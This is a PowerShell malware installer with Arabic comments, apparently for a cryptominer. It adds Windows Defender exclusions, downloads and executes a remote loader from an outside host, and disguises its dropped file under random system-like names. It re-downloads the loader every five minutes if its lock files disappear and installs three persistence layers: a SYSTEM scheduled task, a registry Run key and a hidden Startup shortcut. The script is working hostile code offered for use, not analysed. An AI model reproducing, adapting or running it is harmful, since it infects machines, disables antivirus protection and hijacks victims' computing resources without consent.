# 1. إعدادات المسارات (استخدام Temp لأنه يُفحص أقل من ProgramData في بعض الأحيان)
$BasePath = "C:\Windows\Temp" 
$LockFile = "$BasePath\miner.lock"
$BackupLock = "$env:UserDocuments\miner.bak"

# دالة لتغيير اسم الملف بشكل عشوائي (Identity Rotation)
function Get-RandomFileName {
    $extensions = @(".exe", ".ps1", ".dll")
    $prefixes = @("SystemUpdate", "TempFix", "WinLog", "NetSvc", "CoreLib", "SysMon")
    
    # التصحيح: وضع ( ) حول Get-Random واستخدام -Minimum و-Maximum للتأكد من الدقة
    $ext = $extensions[(Get-Random -Minimum 0 -Maximum $extensions.Count)]
    $pre = $prefixes[(Get-Random -Minimum 0 -Maximum $prefixes.Count)]
    
    return "$($pre)$ext"
}

# 2. إنشاء المجلد الدائم (Persistent Directory)
if (!(Test-Path $BasePath)) {
    New-Item -ItemType Directory -Force -Path $BasePath | Out-Null
}

# 3. كتابة كود التحميل (Payload) في الملف الدائم
# تم تحسين الكود ليكون أكثر خفية واستقراراً
$payload = @"
# --- Phase A: Hardened Exclusions (تجاهل مجلدنا فقط) ---
Add-MpPreference -ExclusionPath "$BasePath" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue

`$lock   = "\$LockFile"
`$backup = "\$BackupLock"

# --- Phase B: The Lock Mechanism (آلية القفل الذكي) ---
if (!(Test-Path `$lock)) {
    # إنشاء ملف القفل في المجلد الدائم
    New-Item -Path `$lock -ItemType File -Force | Out-Null
    
    try {
        # تحميل وتنفيذ الملف من الرابط
        IEX (New-Object Net.WebClient).DownloadString("https://blackpharoah666.online/Loader.ps1")
        
        # نقل ملف القفل المؤقت إلى مكان احتياطي
        Move-Item -Path `$lock -Destination `$backup -Force -ErrorAction SilentlyContinue
    } finally {
        Remove-Item `$lock -ErrorAction SilentlyContinue
    }
}

# --- Phase C: Self-Repair Loop (حلقة الإصلاح الذاتي) ---
`$checkInterval = 300 # فحص كل 5 دقائق
while (`$true) {
    Start-Sleep -Seconds `$checkInterval
    
    # التحقق من وجود "بصمة الحياة" في المجلد الدائم أو الاحتياطي
    if (!(Test-Path `$lock) -and !(Test-Path `$backup)) {
        Write-Host "System detected a crash. Re-initializing..." -ForegroundColor Red
        
        # إعادة بناء البنية الأساسية
        New-Item -ItemType Directory -Force -Path "$BasePath" | Out-Null
        New-Item -Path `$lock -ItemType File -Force | Out-Null

        try {
            IEX (New-Object Net.WebClient).DownloadString("https://blackpharoah666.online/Loader.ps1")
            Move-Item -Path `$lock -Destination `$backup -Force -ErrorAction SilentlyContinue
        } finally {
            Remove-Item `$lock -ErrorAction SilentlyContinue
        }
    }
}
"@

# 4. حفظ السكريبت في المجلد الدائم (مع تغيير الاسم عشوائياً)
$RandomName = Get-RandomFileName
Write-Host "Generated Random Name: $RandomName" -ForegroundColor Cyan

$payload | Out-File -FilePath "$BasePath\$RandomName" -Encoding UTF8 -Force
Write-Host "Permanent script created at: $BasePath\$RandomName" -ForegroundColor Green

# 5. طبقة الاستمرارية الأولى: المهام المجدولة (Task Scheduler)
schtasks /delete /tn "SystemPersistence" /f 2>$null
schtasks /create /tn "SystemPersistence" /sc minute /mo 1 /ru SYSTEM /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$BasePath\$RandomName`"" /f

# 6. طبقة الاستمرارية الثانية: مفتاح التسجيل (Registry Run Key)
$regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
if (!(Test-Path $regKey)) {
    New-Item -Path $regKey -Force | Out-Null
}
# استخدام اسم الملف الدائم مباشرة في التسجيل
Set-ItemProperty -Path $regKey -Name "SystemPersistence" -Value "`"$BasePath\$RandomName`""

Write-Host "Registry Key Updated Successfully." -ForegroundColor Cyan

# 7. طبقة الاستمرارية الثالثة: مجلد التشغيل (Startup Folder)
$startupFolder = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
if (!(Test-Path $startupFolder)) {
    New-Item -ItemType Directory -Force -Path $startupFolder | Out-Null
}

$shortcutPath = "$startupFolder\SystemPersistence.lnk"
if (!(Test-Path $shortcutPath)) {
    # استخدام WScript.Shell لإنشاء اختصار صحيح
    $wshShell = New-Object -ComObject WScript.Shell
    $shortcut = $wshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$BasePath\$RandomName`""
    $shortcut.WorkingDirectory = "C:\Windows\System32"
    $shortcut.Save()
}

Write-Host "Startup Shortcut Created Successfully." -ForegroundColor Cyan
Write-Host "Triple Persistence Layer Installed: Task Scheduler + Registry Run Key + Startup Folder." -ForegroundColor Green
